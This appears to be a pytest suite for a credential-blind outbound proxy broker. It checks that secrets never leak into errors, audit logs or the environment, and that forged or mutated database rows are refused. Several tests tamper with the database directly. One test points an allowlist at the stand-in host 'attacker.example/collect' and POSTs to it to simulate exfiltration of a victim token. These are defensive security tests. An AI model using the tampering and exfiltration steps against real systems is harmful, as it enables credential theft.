from __future__ import annotations

import hashlib
import json
import os
from dataclasses import dataclass
from pathlib import Path

import pytest

from tinyassets.broker.vault import write_credential_vault
from tinyassets.storage.outbound_connections import (
    AmbiguousProxyOutcome,
    ConnectionLedger,
    CredentialBlindBroker,
    ProxyRequestError,
)

ROOT = Path(__file__).resolve().parents[1]


@pytest.fixture(autouse=True)
def admitted_connection_owner(tmp_path):
    from tests.support.broker_double import seed_owner_admission

    seed_owner_admission(tmp_path, principal="user-1", center="universe-1")


@dataclass
class _JsonlDispatch:
    path: str

    def records(self):
        path = Path(self.path)
        if not path.exists():
            return []
        return [
            json.loads(line)
            for line in path.read_text(encoding="utf-8").splitlines()
        ]


@dataclass
class _JsonlAudit:
    path: str

    def __call__(self, record):
        with Path(self.path).open("a", encoding="utf-8") as stream:
            stream.write(json.dumps(record, sort_keys=True) + "\n")

    def records(self):
        path = Path(self.path)
        if not path.exists():
            return []
        return [
            json.loads(line)
            for line in path.read_text(encoding="utf-8").splitlines()
        ]


def _runtime_log(tmp_path, grant_id, filename):
    runtime_id = hashlib.sha256(grant_id.encode("utf-8")).hexdigest()
    return tmp_path / ".broker" / ".outbound-proxy" / runtime_id / filename


def _grant_github_connection(
    ledger: ConnectionLedger,
    *,
    connection_id: str = "conn-github",
    grant_id: str = "grant-github",
    provider: str = "test-fixture.created",
    credential_ref: str = "test-fixture://nonsecret",
) -> None:
    ledger.create_connection(
        connection_id=connection_id,
        owner_user_id="user-1",
        connection_class="pull-request-writer",
        scopes=("pull_requests:write",),
        provider=provider,
        destination="github.com/acme/widgets",
        credential_ref=credential_ref,
    )
    ledger.grant_connection(
        grant_id=grant_id,
        connection_id=connection_id,
        owner_user_id="user-1",

    )


@pytest.mark.verifies('owner-daemon-in-box:T6')
def test_adapter_cannot_recover_secret_from_state_environment_metadata_or_errors(
    tmp_path,
):
    secret = "raw-secret-never-visible-to-adapter"
    vault_path = tmp_path / "vault-secret.txt"
    vault_path.write_text(secret, encoding="utf-8")
    ledger = ConnectionLedger(
        tmp_path / ".broker" / "outbound.db", data_root=tmp_path,
        allow_test_fixtures=True,
        verify_authenticated_principal=lambda: "user-1",
    )
    _grant_github_connection(
        ledger,
        provider="test-fixture.explode",
        credential_ref=f"test-vault-file:{vault_path}",
    )
    audit = _JsonlAudit(
        str(_runtime_log(tmp_path, "grant-github", "audit.jsonl"))
    )
    proxy = ledger.resolve_exact_scoped_proxy(

        grant_id="grant-github", connection_id="conn-github",
    )
    graph_state = {"connection": proxy}
    request_metadata = {
        "provider": proxy.provider,
        "destination": proxy.destination,
        "scopes": proxy.scopes,
    }
    assert not hasattr(proxy, "_dispatch")
    assert not hasattr(proxy, "_dispatch_handle")
    assert not hasattr(proxy._channel, "_process")
    assert not hasattr(proxy._channel, "_dispatch")
    assert not hasattr(proxy._channel._client, "_dispatch")
    assert "_PROXY_DISPATCHERS" not in vars(
        __import__(
            "tinyassets.storage.outbound_connections",
            fromlist=["outbound_connections"],
        )
    )
    with pytest.raises(ProxyRequestError) as raised:
        proxy.request("pull_requests:write", {"title": "Ship"})

    adapter_observations = json.dumps(
        {
            "state": graph_state,
            "environment": dict(os.environ),
            "request_metadata": request_metadata,
            "proxy_error": str(raised.value),
            "proxy_repr": repr(proxy),
            "audit": audit.records(),
        },
        default=repr,
        sort_keys=True,
    )
    assert secret not in adapter_observations
    assert "test-vault-file:" not in adapter_observations
    assert audit.records() == [
        {
            "event": "outbound_proxy_error",
            "grant_id": "grant-github",
            "provider": "test-fixture.explode",
            "destination": "github.com/acme/widgets",
            "verb": "pull_requests:write",
            "reason": "destination request failed",
        }
    ]


@pytest.mark.verifies('owner-daemon-in-box:T6')
def test_credential_resolver_exception_cannot_leak_secret_to_proxy_error(tmp_path):
    secret = "vault-provider-echoed-secret"
    vault_path = tmp_path / "vault-secret.txt"
    vault_path.write_text(secret, encoding="utf-8")
    ledger = ConnectionLedger(
        tmp_path / ".broker" / "outbound.db", data_root=tmp_path,
        allow_test_fixtures=True,
        verify_authenticated_principal=lambda: "user-1",
    )
    _grant_github_connection(
        ledger,
        provider="test-fixture.explode",
        credential_ref=f"test-vault-error:{vault_path}",
    )
    audit = _JsonlAudit(
        str(_runtime_log(tmp_path, "grant-github", "audit.jsonl"))
    )
    proxy = ledger.resolve_exact_scoped_proxy(

        grant_id="grant-github", connection_id="conn-github",
    )

    with pytest.raises(ProxyRequestError) as raised:
        proxy.request("pull_requests:write", {"title": "Ship"})

    assert secret not in str(raised.value)
    assert secret not in json.dumps(audit.records())
    assert audit.records()[0]["reason"] == "credential unavailable"


@pytest.mark.verifies('owner-daemon-in-box:T6')
def test_ambiguous_transport_error_cannot_leak_credential_material(tmp_path):
    secret = "transport-echoed-bearer-secret"
    ledger = ConnectionLedger(tmp_path / ".broker" / "outbound.db", data_root=tmp_path)
    _grant_github_connection(ledger)

    def raise_secret_bearing_error(**_kwargs):
        raise AmbiguousProxyOutcome(
            f"connection reset after send; Authorization: Bearer {secret}"
        )

    broker = CredentialBlindBroker(
        ledger,
        resolve_credential=lambda _ref, _ctype=None: secret,
        network_request=raise_secret_bearing_error,
    )

    with pytest.raises(AmbiguousProxyOutcome) as raised:
        broker.dispatch(
            "grant-github",
            "pull_requests:write",
            {"title": "Ship"},
        )

    assert secret not in str(raised.value)


# --------------------------------------------------------------------------- #
# FIX 4 — production HTTP wiring must compose (Codex REJECT)
# --------------------------------------------------------------------------- #


def _make_http_ledger_with_vault(tmp_path, *, credential_ref="vault://http/anthropic-conn"):
    """Real composition scaffolding: a REAL vault http record + an http connection."""
    from tests.support.admission import Plans
    from tinyassets.broker.owner_identities import OwnerIdentities
    from tinyassets.broker.policy import PolicyStore
    from tinyassets.credential_vault import custody_namespace

    # The vault creates the account directory. Provision open egress first so
    # that directory is not a missing-policy refusal when the broker starts.
    identities = OwnerIdentities(
        tmp_path / ".broker/state/owner-identities.db", plans=Plans(tmp_path))
    store = PolicyStore(tmp_path, identities)
    store.bootstrap_owner("user-1")
    store.read("user-1")
    universe_dir = custody_namespace(tmp_path, "user-1")
    write_credential_vault(
        universe_dir,
        [{
            "credential_type": "http",
            "destination": "anthropic-conn",
            "token": "real-vault-http-token",
        }], owner_user_id="user-1",
    )
    ledger = ConnectionLedger(
        tmp_path / ".broker" / "outbound.db", data_root=tmp_path,
        verify_authenticated_principal=lambda: "user-1",
    )
    ledger.create_connection(
        connection_id="conn-http",
        owner_user_id="user-1",
        connection_class="outbound-http",
        scopes=("POST",),
        provider="http",
        destination="api.example.com",
        credential_ref=credential_ref,
        connection_type="http",
        auth_scheme="bearer",
        allowed_endpoints=[
            {"host": "api.example.com", "path_template": "/v1/messages", "methods": ["POST"]},
        ],
    )
    ledger.grant_connection(
        grant_id="grant-http",
        connection_id="conn-http",
        owner_user_id="user-1",

    )
    return ledger


@pytest.mark.verifies('owner-daemon-in-box:T6')
def test_forged_foreign_scheme_row_never_vends_a_token_to_the_http_driver(
    tmp_path, monkeypatch
):
    # Confused-deputy end-to-end (Codex FIX 1, dispatch side): forge a row whose
    # credential_ref is a foreign scheme (bypassing create_connection's guard by
    # tampering the DB directly). Through the real broker, dispatch must
    # fail at credential RESOLUTION ("credential unavailable") — never reaching the
    # HTTP driver — so no github/workos token is ever POSTed to the attacker.
    import sqlite3

    monkeypatch.setenv("TINYASSETS_OUTBOUND_HTTP_CONNECTIONS_ENABLED", "1")
    ledger = _make_http_ledger_with_vault(tmp_path)
    # Tamper: swap the credential_ref to a WorkOS github token reference and point
    # the allowlist at the attacker's endpoint.
    with sqlite3.connect(tmp_path / ".broker" / "outbound.db") as raw:
        raw.execute(
            "UPDATE outbound_connections SET credential_ref = ? WHERE connection_id = ?",
            ("workos-pipes://github/victim-user", "conn-http"),
        )

    proxy = ledger.resolve_exact_scoped_proxy(

        grant_id="grant-http",
        connection_id="conn-http",
    )
    try:
        with pytest.raises(ProxyRequestError):
            proxy.request(
                "POST",
                {"url": "https://api.example.com/v1/messages", "body": {"x": 1}},
            )
    finally:
        proxy.close()

    audit = _JsonlDispatch(str(_runtime_log(tmp_path, "grant-http", "audit.jsonl")))
    # Failed at RESOLUTION — the http resolver refused the foreign ref and the
    # network driver was NEVER invoked (no exfil). NOT "destination request failed".
    assert [record["reason"] for record in audit.records()] == ["credential unavailable"]


@pytest.mark.verifies('owner-daemon-in-box:T6')
def test_row_mutation_from_legacy_to_http_after_proxy_start_is_refused(
    tmp_path, monkeypatch
):
    # Codex FIX 1 TOCTOU (the exact repro): start a LEGACY proxy, then mutate its
    # row to connection_type="http" with an attacker allowlist while keeping the
    # legacy (non-http) credential_ref. Dispatch re-reads the mutated row but must
    # REFUSE it — the resolver's type frozen at proxy start is stale, yet the
    # credential is never resolved and the VICTIM token is never POSTed to the
    # attacker's endpoint.
    import sqlite3

    monkeypatch.setenv("TINYASSETS_OUTBOUND_HTTP_CONNECTIONS_ENABLED", "1")
    victim = tmp_path / "victim_token.txt"
    victim.write_text("VICTIM-GITHUB-TOKEN", encoding="utf-8")
    ledger = ConnectionLedger(
        tmp_path / ".broker" / "outbound.db", data_root=tmp_path,
        allow_test_fixtures=True,
        verify_authenticated_principal=lambda: "user-1",
    )
    ledger.create_connection(
        connection_id="conn-legacy",
        owner_user_id="user-1",
        connection_class="pull-request-writer",
        scopes=("POST",),
        provider="test-fixture.created",
        destination="github.com/acme/widgets",
        credential_ref=f"test-vault-file:{victim}",  # legacy (non-http) scheme
        connection_type="",
    )
    ledger.grant_connection(
        grant_id="grant-legacy",
        connection_id="conn-legacy",
        owner_user_id="user-1",

    )
    proxy = ledger.resolve_exact_scoped_proxy(

        grant_id="grant-legacy",
        connection_id="conn-legacy",
    )
    # Mutate the row AFTER the proxy (and its frozen resolver) started.
    attacker_allowlist = json.dumps([
        {
            "host": "attacker.example",
            "path_template": "/collect",
            "methods": ["POST"],
            "param_patterns": {},
            "allowed_query": [],
            "query_patterns": {},
        }
    ])
    with sqlite3.connect(tmp_path / ".broker" / "outbound.db") as raw:
        raw.execute(
            "UPDATE outbound_connections "
            "SET connection_type='http', allowed_endpoints_json=? "
            "WHERE connection_id=?",
            (attacker_allowlist, "conn-legacy"),
        )
    try:
        with pytest.raises(ProxyRequestError):
            proxy.request(
                "POST", {"url": "https://attacker.example/collect", "body": {"x": 1}}
            )
    finally:
        proxy.close()

    audit = _JsonlDispatch(str(_runtime_log(tmp_path, "grant-legacy", "audit.jsonl")))
    # Refused at credential resolution — the mutated http row's credential_ref
    # scheme (test-vault-file) does not match http, so nothing was resolved and
    # the network driver was NEVER invoked (no exfil to the attacker).
    assert [r["reason"] for r in audit.records()] == ["credential unavailable"]
    assert "VICTIM-GITHUB-TOKEN" not in json.dumps(audit.records())


@pytest.mark.verifies('owner-daemon-in-box:T6')
def test_row_mutation_from_http_to_legacy_after_proxy_start_is_refused(
    tmp_path, monkeypatch
):
    # The reverse mutation: start an http proxy, then mutate its row to legacy
    # ("") while keeping the vault://http/ credential_ref. Dispatch must refuse —
    # a non-http row may not carry an http credential scheme.
    import sqlite3

    monkeypatch.setenv("TINYASSETS_OUTBOUND_HTTP_CONNECTIONS_ENABLED", "1")
    ledger = _make_http_ledger_with_vault(tmp_path)
    proxy = ledger.resolve_exact_scoped_proxy(

        grant_id="grant-http",
        connection_id="conn-http",
    )
    with sqlite3.connect(tmp_path / ".broker" / "outbound.db") as raw:
        raw.execute(
            "UPDATE outbound_connections SET connection_type='' WHERE connection_id=?",
            ("conn-http",),
        )
    try:
        with pytest.raises(ProxyRequestError):
            proxy.request(
                "POST", {"url": "https://api.example.com/v1/messages", "body": {"x": 1}}
            )
    finally:
        proxy.close()

    audit = _JsonlDispatch(str(_runtime_log(tmp_path, "grant-http", "audit.jsonl")))
    assert [r["reason"] for r in audit.records()] == ["credential unavailable"]
    assert "real-vault-http-token" not in json.dumps(audit.records())
